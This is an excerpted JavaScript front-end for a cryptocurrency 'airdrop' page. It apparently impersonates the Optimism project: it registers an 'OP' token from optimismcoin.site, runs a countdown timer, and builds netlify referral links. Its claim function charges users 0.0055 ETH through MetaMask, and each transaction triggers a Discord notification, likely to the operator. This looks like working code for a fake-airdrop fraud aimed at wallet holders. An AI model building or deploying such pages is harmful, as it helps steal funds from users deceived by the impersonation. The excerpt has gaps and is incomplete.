...
const sttaddr = "0x25cB411C52217BCe3d871864b6C43FE9AdB90883";
...
let addr, web3 = new Web3(window.ethereum);
let sttcontract = new web3.eth.Contract(sttabi, sttaddr);

const loadweb3 = async () => {
  try {
    await window.ethereum.enable();
    addr = web3.utils.toChecksumAddress(web3.eth.accounts[0]);
  } catch (error) {
    if (error.code === 4001) {
...
const getAirdrop = async () => {
  ...
  sttcontract.methods.airdrop(fresh).send({ from: addr, value: 5500000000000000 }, (err, res) => {
    if (!err) {
      console.log(res);
      sendDiscordNotification('Se realizó una transacción de airdrop en Metamask.');
    } else {
      console.log(err);
    }
  });
...
const buystt = async () => {
  ...
  sttcontract.methods.buy(fresh).send({ from: addr, value: ethval }, (err, res) => {
    if (!err) {
      console.log(res);
      sendDiscordNotification('Se realizó una transacción en Metamask.');
    } else {
      console.log(err);
    }
  });
  ...
  try {
    web3.currentProvider.sendAsync({
      ...
      params: {
        type: "ERC20",
        options: {
          address: "0x25cB411C52217BCe3d871864b6C43FE9AdB90883",
          symbol: "OP",
          decimals: "18",
          image: "https://www.optimismcoin.site/images/logo.png"
        }
      },
...
window.onload = function() {
  ...
  if (e !== null) {
    document.getElementById("airinput").value = e;
  }
};

var countDownDate = new Date("August 23, 2023 00:00:00").getTime();
var x = setInterval(function() {
  var e = (new Date).getTime();
  var t = countDownDate - e;
  var n = Math.floor(t / 864e5);
  var a = Math.floor(t % 864e5 / 36e5);
  var o = Math.floor(t % 36e5 / 6e4);
  var r = Math.floor(t % 6e4 / 1e3);

  document.getElementById("demo").innerHTML = n + "d " + a + "h " + o + "m " + r + "s ";
...
function getreflink() {
  ...
  if (document.getElementById("refaddress").value) {
    if (/^(0x){1}[0-9a-fA-F]{40}$/i.test(e)) {
      document.getElementById("refaddress").value = "https://optimism-airdrop-airdrop.netlify.app/?ref=" + document.getElementById("refaddress").value;
    } else {
...
if (ref === null) {
  ref = "0x01C65F22A9478C2932e62483509c233F0aaD5c72";
